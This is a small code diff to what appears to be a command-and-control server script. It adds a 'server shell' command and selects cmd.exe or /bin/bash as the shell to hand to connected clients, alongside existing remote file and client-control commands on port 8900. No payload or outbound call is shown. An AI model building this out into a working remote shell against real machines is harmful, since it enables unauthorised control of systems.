@@ -26,12 +26,17 @@ class C2Commands(Enum):
     SERV_ZIP = "server zip"
     SERV_UZIP = "server unzip"
     SERV_LS = "server list"
+    SERV_SHELL = "server shell"
     SERV_CTRL = "server control "
     SERV_SH_CLS = "server show clients"
     CD = "cd "
 
 PORT = 8900
 
+if platform.system() == "Windows":
+    SHELL = "cmd.exe"
+else:
+    SHELL = "/bin/bash"
 
 # Leave blank to bind to all int otherwise specify c2 server IP address
 BIND_ADDR = ""
